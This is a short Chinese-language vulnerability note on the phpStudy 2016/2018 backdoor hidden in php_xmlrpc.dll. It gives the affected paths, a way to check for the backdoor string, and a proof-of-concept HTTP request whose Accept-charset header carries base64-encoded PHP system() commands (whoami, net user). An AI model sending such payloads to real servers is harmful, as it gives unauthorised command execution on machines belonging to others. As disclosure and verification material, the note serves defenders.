# 影响版本

- phpStudy2016
    `php\php-5.2.17\ext\php_xmlrpc.dll`
    `php\php-5.4.45\ext\php_xmlrpc.dll`
- phpStudy2018
    `PHPTutorial\php\php-5.2.17\ext\php_xmlrpc.dll`
    `PHPTutorial\php\php-5.4.45\ext\php_xmlrpc.dll`

## 后门验证：

用记事本或者Notepad++打开phpstudy安装目录下的：

```
PHPTutorial\php\php-5.4.45\ext\php_xmlrpc.dll
```

存在`@eval(%s('%s'));`即说明有后门。



poc:

Accept-charset: ZWNobyBzeXN0ZW0oIndob2FtaSIpOw==

ZWNobyBzeXN0ZW0oIm5ldCB1c2VyICIpOw==

Accept-Encoding: gzip,deflate

ZWNobyBzeXN0ZW0oIndob2FtaSIpOw== 为echo system("whoami"); base64编码后内容
